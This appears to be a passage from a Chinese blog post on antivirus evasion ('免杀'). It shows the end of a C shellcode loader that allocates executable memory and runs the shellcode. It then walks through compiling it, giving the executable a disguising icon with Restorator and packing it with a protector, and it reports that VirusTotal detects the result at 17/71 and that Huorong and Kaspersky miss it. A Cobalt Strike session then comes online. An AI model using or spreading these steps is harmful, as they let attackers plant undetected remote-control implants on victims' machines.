class="hljs-function"></span>&#123;<br><span class="hljs-comment">//ShellExecute(NULL, _T(&quot;open&quot;), _T(&quot;explorer.exe&quot;), _T(&quot;https://www.baiud.com&quot;), NULL, SW_SHOW);</span><br>LPVOID Memory = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br><span class="hljs-built_in">memcpy</span>(Memory, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br>((<span class="hljs-keyword">void</span>(*)())Memory)();<br>&#125;<br></code></pre></td></tr></table></figure><p>在Visual Studio中新建控制台应用程序并复制代码</p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/848c9909-f79a-4d4d-a14d-8adadbf2d270.png" alt="imgbed.cn图床"></p><p>按如图设置编译选项</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/afd7a7bd-5ad8-4a2d-bc55-9fea6c9e4c57.png" alt="imgbed.cn图床"></a></p><p>选择重新生成解决方案，生成ConsoleApplication4.exe</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/be996b9f-eb07-4d1b-9fd8-b53ff6524b03.png" alt="imgbed.cn图床"></a></p><h2 id="使用用Restorator-2018为生成的exe文件添加图标"><a href="#使用用Restorator-2018为生成的exe文件添加图标" class="headerlink" title="使用用Restorator 2018为生成的exe文件添加图标"></a>使用用Restorator 2018为生成的exe文件添加图标</h2><p>将ConsoleApplication4.exe拖入Restorator 2018，右键选择添加资源，名称可随意填写</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/05b62602-dc02-4910-b719-0aece94f7419.PNG" alt="imgbed.cn图床"></a></p><p>将ico文件拖入Restorator 2018并保存</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/e39947a4-6d66-4a19-94e1-40670743ea9b.PNG" alt="imgbed.cn图床"></a></p><h2 id="运用shielden为exe文件加壳"><a href="#运用shielden为exe文件加壳" class="headerlink" title="运用shielden为exe文件加壳"></a>运用shielden为exe文件加壳</h2><p>设置如下</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/4978b4bc-0ef5-4b6d-b997-1b5b1a7b9d72.png" alt="imgbed.cn图床"></a></p><h2 id="免杀效果"><a href="#免杀效果" class="headerlink" title="免杀效果"></a>免杀效果</h2><p>virustotal.com上 shellcode_launcher.exe 查杀率为17/71  </p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/0aa77773-af58-4324-9c6b-e51286f459b2.png" alt="imgbed.cn图床"></p><p>本地测试，静态扫描火绒与卡巴斯基均不查杀</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/d405eea2-6054-42ce-9e01-2d5285c040c9.PNG" alt="imgbed.cn图床"></a></p><p>cs上线</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/52a16bf0-671d-47fa-94ea-5877e7dfd8df.png" alt="imgbed.cn图床"></a></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.xljtj.com/archives/c-shellcode.html?from=timeline&isappinstalled=0">使用 C 编译 shellcode 免杀上线</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
